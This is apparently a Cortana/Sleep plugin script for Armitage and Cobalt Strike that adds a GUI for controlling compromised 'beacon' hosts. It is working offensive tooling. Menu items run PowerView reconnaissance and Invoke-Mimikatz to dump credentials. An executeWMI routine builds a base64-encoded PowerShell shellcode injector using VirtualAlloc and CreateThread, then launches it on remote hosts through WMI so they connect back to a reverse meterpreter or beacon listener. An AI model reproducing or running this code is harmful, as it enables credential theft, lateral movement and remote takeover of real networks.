# needed imports for custom menu creation
import java.awt.*; # for borderlayout
import javax.swing.*; # for jpanel
import javax.swing.table.*; #tablerowsorter
import table.*; # generictablemodel
import ui.*; #atable


# internal list to keep track of all active beacons
%beaconHosts = %();

# modify the host image for any beacon
filter host_image {

    local('$address');
    $address = $2['address'];

    # if this address has an active beacon
    if ($address in %beaconHosts){
        # check if the .png script resource is in a subdirectory (for load_all.cna)
        if (-exists script_resource("/beacon/beacon_image.png")){
            # change its host icon
            push($1, script_resource("/beacon/beacon_image.png"));
        }
        else{
            # otherwise assume the resource is in the script location
            push($1, script_resource("beacon_image.png"));
        }
    }
    return @_;
}

# check the database for beacons every 5 seconds
# TODO: refresh the beaconHosts list with the active beacon list
on heartbeat_5s {

    # get all the active beacons from the database
    @beacons = call('beacon.list');

    # reset the internal beacon list
    %beaconHosts = %();

    # rebuild the internal beacon list
    foreach %beacon (@beacons) {
        # %beacon => ($id, $computer, $host, $last, $external, $pid, $user, $internal)

        # get the internal IP for the beacon
        $internal = %beacon["internal"];

        if ($internal ne ""){
            %beaconHosts[$internal] = %beacon["id"];
        }

        # if this beacon host isn't currently in the database, add it
        # so it'll appear in the workspace
        @hosts = host_addresses();
        if ($internal !in @hosts){
            host_add($internal);
        }

        $data = host_data($internal);

        if ($data ne $null){
            $currentLabel = host_data($internal)['label'];
            %label[$internal] = $currentLabel;

            # if this host isn't marked as a beacon, mark it
            if ("beacon *" !iswm $currentLabel){
                %label[$internal] = "beacon $currentLabel";
            }

            # push the new/existing label
            call_async("db.report_labels", %label);
        }
    }

    # grab all active session addresses
    $addresses = host_addresses();

    # iterate through all of our active addresses
    foreach $address ($addresses){

        # grab the host's label
        $currentLabel = host_data($address)['label'];

        # if the host is not in our active beacon list
        if ($address !in %beaconHosts){
            # if the label is "beacon ", reset the label to the original value
            if ( "beacon *" iswm $currentLabel){
                # cut out the "beacon " section
                %label[$address] = substr($currentLabel,7);
                # push the new label
                call_async("db.report_labels", %label);
            }
        }

    }
}

popup beacon_top {

    $address = $1;
            menu "PowerShell" {
                item "PowerView" {
                    $beaconID = %beaconHosts[$address];
                    task_powerview($beaconID);
                }
                item "Get-NetDomain" {
                    $beaconID = %beaconHosts[$address];
                    task_getdom($beaconID);
                }
                item "Get-NetDomainControllers" {
                    $beaconID = %beaconHosts[$address];
                    task_getdcs($beaconID);
                }
                item "Invoke-Mimikatz" {
                    $beaconID = %beaconHosts[$address];
                    task_mimikatz($beaconID);
                }
                item "Invoke-NetView" {
                    $beaconID = %beaconHosts[$address];
                    task_netview($beaconID);
                }
                item "Invoke-FindLocalAdminAccess"{
                    $beaconID = %beaconHosts[$address];
                    task_localadmin($beaconID);
                }
                item "Invoke-WMI" {
                    $beaconID = %beaconHosts[$address];
                    wmi_dialog($beaconID);
                }
                item "Interact" {
                $beaconID = %beaconHosts[$address];
                # open up the beacon console for this particular ID
                open_beacon_console($beaconID, "- $address", $address)
                }
        }
}


# task our our beacon to import the specified powershell script
sub task_powershell_import {
    # task ID ($1) with powershell command + args ($2)
    local('$id $len');

    $id = $1;
    $data = $2;
    $len = strlen($data);

    # task beacon to import the PowerShell script
    call("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
    call("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
}

# task our beacon to execute a given powershell command
sub task_powershell {

    $id = $1;
    $len  = strlen($2);

    call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
    call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
}

sub sleep_dialog {

    # get all the active beacons from the database
    @beacons = call('beacon.list');

    $t = prompt_text("How long should beacon sleep for (seconds jitter%)?", "60");

    @parts = split(' ', $t);
    $jitter = 0;

    if(size(@parts) eq 2){
        $jitter = @parts[1];
    }

    $sleeptime = @parts[0];

    foreach %beacon (@beacons) {
        $id = %beacon["id"];
        call('beacon.task', $id, pack("IIII", 0x04, 8, int($sleeptime) * 1000, int($jitter)), lhost());
    }
}


sub kill_dialog {

    $answer = prompt_confirm("Kill all beacons?", "Kill Beacons");
    if($answer eq 0){
        # get all the active beacons from the database
        @beacons = call('beacon.list');

        foreach %beacon (@beacons) {
            $id = %beacon["id"];
            call('beacon.task', $id, pack("II", 0x03, 0), lhost());
        }

    }
}



###################################################
#
# User interaction methods.
#
###################################################

sub prompt_listener {

    local('@raw_data @raw_listeners @listeners');

    @raw_data = data_list("cloudstrike.listeners");
    @raw_listeners = split('!!', @raw_data[0]);
    @listeners = @();

    foreach $raw_listener (@raw_listeners) {
        if ($raw_listener ne "") {
            local('$name $payload $port $migrate $null $null $domains %beacon %listener');
            ($name, $payload, $port, $migrate, $null, $null, $domains) = split('@@', $raw_listener);
            $s = size(split('@@', $raw_listener));

            # if we have a beacon listener
            if ($s == 7){
                ($name, $payload, $port, $migrate, $host1, $host2, $host3) = split('@@', $raw_listener);
                %beacon = %(name => $name, payload => $payload, host => $host1, port => $port);
                push(@listeners, %beacon);
            }

            # otherwise a meterpreter listener
            else {
                ($name, $payload, $port, $migrate, $host, $null) = split('@@', $raw_listener);
                %listener = %(name => $name, payload => $payload, host => $host, port => $port);
                push(@listeners, %listener);
            }
        }
    }

    prompt_list("Listener to Use", @("Use", "Cancel"), @('name', 'payload', 'host', 'port'), @listeners, 900, 800);

    on item_selected {
        if ($1 eq "Use"){
            # warn(@_);
            $payload = $3[1];
            $lhost = $3[2];
            $lport = $3[3];

            # fill in the selected values from the chosen listener
            [$model setValueForKey:"Payload +","Value",$payload];
            [$model setValueForKey:"LHOST","Value",$lhost];
            [$model setValueForKey:"LPORT","Value",$lport];

            # update the model values
            [$model fireListeners];
        }
    }
}


# choose a particular payload from a list and fill
# the value into the calling table
sub choose_payload {

    local('@payloads $file $handlef');

    @payloads = @(
        %(payload => "windows/meterpreter/reverse_tcp"),
        %(payload => "windows/meterpreter/reverse_http"),
        %(payload => "windows/meterpreter/reverse_https"),
        %(payload => "windows/meterpreter/reverse_ipv6_tcp"),
        %(payload => "windows/meterpreter/reverse_ipv6_http"),
        %(payload => "windows/meterpreter/reverse_ipv6_https"),
        %(payload => "windows/beacon/reverse_http"),
        %(payload => "windows/beacon/reverse_https"),
        %(payload => "windows/shell/reverse_tcp"),
        %(payload => "")
    );

    # first col argument -> data that's returned when "select" is chosen
    quickListDialog("Choose a Payload", "Select", @("payload", "payload"), @payloads, $width => 350, $height => 240, lambda({
        [$call : $1];
    }, $call => $4), \$tablef);
}


sub choose_rhost_file {

    local('$file $handlef @rhosts');
    @rhosts = @();

    # read in a list of users to hunt for
    $file = prompt_file_open("RHOST List");

    if ($file ne ""){
        $handlef = openf($file);
        while $readf (readln($handlef)){
            add(@rhosts, $readf);
        }
    }

    $hosts = join(",", @rhosts);
    return $hosts;
}


# Main user-interaction dialog
#
# adapted from armitage/scripts/attacks.sl
# thanks for the bsd license raffi :)
#
sub wmi_dialog {

    local('$center $south $c $x $executeButton');

    $beacon_id = $1;

    # main title and dimensions of the dialog box
    $dialog = dialog("WMI (PowerShell)", 590, 265);

    # build out the option list table for the specified payload
    $model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
    [$model setCellEditable: 1];

    [$model _addEntry: %(Option => "RHOST +", Tooltip => "RHOST to target", Hide => '0')];
    [$model _addEntry: %(Option => "RemoteUser", Tooltip => "Remote user account to use for login (optional)", Hide => '0')];
    [$model _addEntry: %(Option => "RemotePass", Tooltip => "Remote password to use for login (optional)", Hide => '0')];
    [$model _addEntry: %(Option => "Payload +", Tooltip => "payload to use (if applicable)", Hide => '0')];
    [$model _addEntry: %(Option => "LHOST", Value => lhost(), Tooltip => "LHOST to connect back to", Hide => '0')];
    [$model _addEntry: %(Option => "LPORT", Tooltip => "LPORT to connect back to", Hide => '0')];

    $table = [new ATable: $model];

    # add in the handler to manage clicks on each option
    valueListener($table, $model);

    # set up the panes
    $center = [new JScrollPane: $table];
    $south = [new JPanel];
    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];

    # [$south setLayout: [new GridLayout: 3, 1]]; # original -> more rows
    [$south setLayout: [new GridLayout: 2, 1]];

    $c = [new JPanel];
    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];

    # our buttons
    $executeButton = [new JButton: "Execute"];
    $listenerButton = [new JButton: "Use Listener"];
    $cancelButton = [new JButton: "Cancel"];

    # selected if the user wants use the RunWOW64 version of PowerShell
    $runwowCheckBox = [new JCheckBox: "RunWOW64"];
    [$runwowCheckBox setSelected: 1];

    # add a lambda listener to trigger the generation of our payload
    [$executeButton addActionListener: lambda({

        syncTable($table);
        $options = %();

        # grab all the filled in option values from the table
        for ($x = 0; $x < [$model getRowCount]; $x++) {
            $options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
        }

        # kick off out payload generation and delivery
        executeWMI($beacon_id, $options["RHOST +"], $options["RemoteUser"], $options["RemotePass"], $options["Payload +"], $options["LHOST"], $options["LPORT"], [$runwowCheckBox isSelected]);
        [$dialog setVisible: 0]; # close the dialog off
        })];

    # fire off the listener prompt
    [$listenerButton addActionListener: lambda({
        prompt_listener(\$model);
        }, \$dialog)];

    [$cancelButton addActionListener: lambda({ [$dialog setVisible: 0]; }, \$dialog)];

    # add the buttons to the frame
    [$c add: $executeButton];
    [$c add: $listenerButton];
    [$c add: $cancelButton];
    [$south add: left($runwowCheckBox)];
    [$south add: $c];

    # build the final pane layout
    local('$s');
    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
    [$center setPreferredSize: [new Dimension: 0, 0]];

    [$s resetToPreferredSizes];
    [$s setOneTouchExpandable: 1];

    [$dialog add: $s, [BorderLayout CENTER]];
    [$dialog add: $south, [BorderLayout SOUTH]];

    [$executeButton requestFocus];
    [$dialog setVisible: 1];
}


###################################################
#
# PowerShell generation/execution
#
###################################################

# arguments ->
#       $1 = Beacon ID
#       $2 : RHOST
#       $3 : RemoteUser
#       $4 : RemotePass
#       $5 : Payload
#       $6 : LHOST
#       $7 : LPORT
#       $8 : RunWOW64
sub executeWMI {

    $beacon_id = $1;
    $RHOST = $2;
    $RemoteUser = $3;
    $RemotePass = $4;
    $Payload = $5;
    $LHOST = $6;
    $LPORT = $7;
    $RunWOW64 = $8;

    # get RHOSTS into the form needed
    $RHOST = "\"".replace($RHOST, ", ", "\",\"")."\"";

    # temporary fix - cast beacon_http to meterpreter/reverse_http
    $Payload = strrep($Payload, "beacon_https", "meterpreter");
    $Payload = strrep($Payload, "beacon_http", "meterpreter");

    # generate the PowerShell payload with our given parameters
    $payload = generate($Payload, $LHOST, $LPORT, %(), "powershell");
    $script = "";

    # the payload skeleton + our generated shellcode
    $temp = '$Pj = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@
$nOx = Add-Type -memberDefinition $Pj -Name "Win32" -namespace Win32Functions -passthru
'.$payload.'
$jy = $nOx::VirtualAlloc(0,[Math]::Max($buf.Length,0x1000),0x3000,0x40)
for ($FE=0;$FE -le ($buf.Length-1);$FE++) {
  $nOx::memset([IntPtr]($jy.ToInt32()+$FE),$buf[$FE],1)|Out-Null
}
$nOx::CreateThread(0,0,$jy,0,0,0)|Out-Null
Start-Sleep -s 1000000';

    # unicode escape the payload
    for($i = 0; $i < strlen($temp); $i++){
        $script = $script . charAt($temp, $i) . "\x00";
    }

    # base64 encode the payload, for -enc usage
    $encoded = [msf.Base64 encode: $script];

    # command to invoke, see if we need the syswow64 PowerShell
    if( ! $RunWOW64){
        $script = "function update{Invoke-WmiMethod -ComputerName ".$RHOST." -Path Win32_process -Name create -ArgumentList \"powershell.exe -enc ".$encoded."\"}";
    }
    else{
        $script = "function update{Invoke-WmiMethod -ComputerName ".$RHOST." -Path Win32_process -Name create -ArgumentList \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -enc ".$encoded."\"}";
    }

    # task the beacon to import the payload data
    task_powershell_import($beacon_id, $script);

    # actually task the beacon to execute the WMI payload
    task_powershell($beacon_id, "update|Out-Null");
}


# other powershell imports/functionality
sub task_powerview {

    $beacon_id = $1;

    if (-exists script_resource("/beacon/PowerView.ps1")){
       $script_source = script_resource("/beacon/PowerView.ps1");
    }
    else{
        $script_source = script_resource("PowerView.ps1");
    }

    # get all of our data that we're going to upload
    $handle = openf($script_source);
    $data = readb($handle, -1);
    closef($handle);

    # task the beacon to import the powershell data
    task_powershell_import($beacon_id, $data);

    # actually task the beacon
    # task_powershell($beacon_id, "Invoke-AllChecks");
}

sub task_netview {
    $beacon_id = $1;
    # actually task the beacon
    task_powershell($beacon_id, "Invoke-Netview");
}

sub task_getdom {
    $beacon_id = $1;
    # actually task the beacon
    task_powershell($beacon_id, "Get-NetDomain");
}

sub task_getdcs {
    $beacon_id = $1;
    # actually task the beacon
    task_powershell($beacon_id, "Get-NetDomainControllers");
}

sub task_mimikatz {

    $beacon_id = $1;

    if (-exists script_resource("/beacon/Invoke-Mimikatz.ps1")){
       $script_source = script_resource("/beacon/Invoke-Mimikatz.ps1");
    }
    else{
        $script_source = script_resource("Invoke-Mimikatz.ps1");
    }

    # get all of our data that we're going to upload
    $handle = openf($script_source);
    $data = readb($handle, -1);
    closef($handle);

    # task the beacon to import the powershell data
    task_powershell_import($beacon_id, $data);

    # actually task the beacon
    task_powershell($beacon_id, "Invoke-Mimikatz -Verbose -DumpCreds");
}

sub task_localadmin {

    $beacon_id = $1;

    if (-exists script_resource("/beacon/PowerView.ps1")){
       $script_source = script_resource("/beacon/PowerView.ps1");
    }
    else{
        $script_source = script_resource("PowerView.ps1");
    }

    # get all of our data that we're going to upload
    $handle = openf($script_source);
    $data = readb($handle, -1);
    closef($handle);

    # task the beacon to import the powershell data
    task_powershell_import($beacon_id, $data);

    # actually task the beacon
    task_powershell($beacon_id, "Invoke-FindLocalAdminAccess");
}


###################################################
#
# Misc helpers
#
###################################################

# adapted from addFileListener() in armitage/scripts/attacks.sl
# listener method for when an option is double clicked in the
# main dialoag menu
sub valueListener {
    local('$table $model $actions');
    ($table, $model, $actions) = @_;

    if ($actions is $null) {
        $actions = %();
    }

    # when LHOST is clicked, revert back to lhost() value
    $actions["LHOST"] = { [$4: lhost()]; };

    # when Payload is clicked, choose a MSFPaylaod
    $actions["Payload +"] = lambda(&choose_payload);

    $actions["RHOST +"] = {
        local('$title $temp');
        $title = "Select $1";
        $temp = chooseFile(\$title, $dir => ".", $always => "1");
        if ($temp !is $null) {
            local('$handle');
            $handle = openf($temp);
            @addresses = readAll($handle);
            closef($handle);

            [$4: join(", ", @addresses)];
        }
    };

    # helping logic for mouse interaction
    addMouseListener($table, lambda({
        if ($0 eq 'mouseClicked' && [$1 getClickCount] >= 2) {
            local('$type $row $action $change $value');

            $value = [$model getSelectedValueFromColumn: $table, "Value"];
            $type = [$model getSelectedValueFromColumn: $table, "Option"];
            $row = [$model getSelectedRow: $table];

            # look for a direct match first
            foreach $action => $change ($actions) {
                if ($action eq $type) {
                    [$change: $type, $value, $row, lambda({
                        [$model setValueAtRow: $row, "Value", "$1"];
                        [$model fireListeners];
                    }, \$model, \$row)];
                    return;
                }
            }

            # fall back to looking for a wildcard match
            foreach $action => $change ($actions) {
                if ($action iswm $type) {
                    [$change: $type, $value, $row, lambda({;
                        [$model setValueAtRow: $row, "Value", "$1"];
                        [$model fireListeners];
                    }, \$model, \$row)];
                    return;
                }
            }
        }
    }, \$model, \$table, \$actions));
}


###################################################
#
# GUI Helper Methods
#   these are all from armitage/scripts/gui.sl
#
###################################################

# creates a list dialog, from armitage/scripts/gui.sl
# $1 = title, $2 = button text, $3 = columns, $4 = rows, $5 = callback
sub quickListDialog {
    local('$dialog $panel $table $row $model $button $sorter $after $a $tablef');
    $dialog = dialog($1, $width, $height);
    $panel = [new JPanel];
    [$panel setLayout: [new BorderLayout]];

    ($table, $model) = setupTable($3[0], sublist($3, 1), $4);
    [$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];

    if ($tablef !is $null) {
        [$tablef: $table, $model];
    }

    $button = [new JButton: $2];
    [$button addActionListener: lambda({
        [$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model];
        [$dialog setVisible: 0];
    }, \$dialog, $callback => $5, \$model, \$table, $lead => $3[0])];

    local('$south');
    $south = [new JPanel];
        [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];

    if ($after !is $null) {
        foreach $a ($after) {
            [$south add: $a];
        }
    }
    [$south add: center($button)];

    [$panel add: $south, [BorderLayout SOUTH]];
    [$dialog add: $panel, [BorderLayout CENTER]];
    [$dialog show];
    [$dialog setVisible: 1];
}

# from armitage/scripts/gui.sl
sub setupTable {
    local('$table $model $sorter $row $index $col');
    $model = [new GenericTableModel: $2, $1, 8];
    foreach $row ($3) {
        [$model _addEntry: $row];
        }

    $table = [new ATable: $model];
    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
    $sorter = [new TableRowSorter: $model];
    [$table setRowSorter: $sorter];

    # make sure our columns have sorters that make sense
    foreach $index => $col ($2) {
        if ($col eq "session_host" || $col eq "host" || $col eq "Host") {
            [$sorter setComparator: $index, &compareHosts];
        }
        else if ($col eq "port" || $col eq "sid" || $col eq "Port") {
            [$sorter setComparator: $index, { return $1 <=> $2; }];
        }
    }

    return @($table, $model);
}

# from armitage/scripts/gui.sl
sub chooseFile {
    local('$fc $file $title $sel $dir $multi $always $dirsonly');

    if ($REMOTE && $always is $null) {
        if ($client !is $mclient) {
            local('$file');
            $file = chooseFile(\$title, \$file, \$sel, \$dir, \$dirsonly, \$multi, \$fc, $always => 1);
            if (-exists $file) {
                print_info("uploading $file");
                return uploadFile($file);
            }
            return "";
        }
        else {
            return ask("Please type a file name:");
        }
    }

    $fc = [new JFileChooser];

    if ($title !is $null) {
        [$fc setDialogTitle: $title];
    }

    if ($sel !is $null) {
        [$fc setSelectedFile: [new java.io.File: $sel]];
    }

    if ($dir !is $null) {
        [$fc setCurrentDirectory: [new java.io.File: $dir]];
    }

    if ($multi !is $null) {
        [$fc setMultiSelectionEnabled: 1];
    }

    if ($dirsonly !is $null) {
        [$fc setFileSelectionMode: [JFileChooser DIRECTORIES_ONLY]];
    }

    [$fc showOpenDialog: $null];

    if ($multi) {
        return [$fc getSelectedFiles];
    }
    else {
        $file = [$fc getSelectedFile];
        if ($file !is $null) {
            if (-exists $file) {
                return $file;
            }
            showError("$file does not exist!");
        }
    }
}

# from armitage/scripts/gui.sl
sub center {
    local('$panel $c');
    $panel = [new JPanel];
    [$panel setLayout: [new FlowLayout: [FlowLayout CENTER]]];

    foreach $c (@_) {
        [$panel add: $c];
    }

    return $panel;
}

# from armitage/scripts/gui.sl
sub left {
    local('$panel $c');
    $panel = [new JPanel];
    [$panel setLayout: [new FlowLayout: [FlowLayout LEFT]]];

    foreach $c (@_) {
        [$panel add: $c];
    }

    return $panel;
}

# from armitage/scripts/gui.sl
sub syncTable {
    if ([$1 isEditing]) {
        [[$1 getCellEditor] stopCellEditing];
    }
}

# helper, from armitage/scripts/gui.sl
sub addMouseListener {
    [$1 addMouseListener: [new SafeMouseListener: $2]];
}

# helper, from armitage/scripts/gui.sl
sub dialog {
    local('$dialog');
        $dialog = [new JFrame: $1];
        [$dialog setSize: $2, $3];
        [$dialog setLayout: [new BorderLayout]];
        # [$dialog setLocationRelativeTo: $__frame__];
    return $dialog;
}

menubar("Beacons", "beaconinterface", 2);

# modify the main "Attacks" menu
popup beaconinterface {
    item "Sleep All" {
        sleep_dialog();
    }
    item "Kill All"{
        kill_dialog();
    }
}
